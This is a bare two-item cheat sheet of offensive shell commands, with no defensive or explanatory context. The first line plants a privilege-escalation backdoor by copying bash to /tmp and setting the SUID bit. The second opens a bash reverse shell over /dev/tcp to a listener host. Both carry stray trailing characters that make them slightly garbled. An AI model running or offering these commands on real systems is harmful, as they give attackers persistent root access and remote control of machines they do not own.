
Reverse Root Shell Backdoor with SUID privileges

	/bin/sh -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'ls


Typical Reverse shell with Bash

	/bin/bash -i >& /dev/tcp/localListener/localport# 0>&1


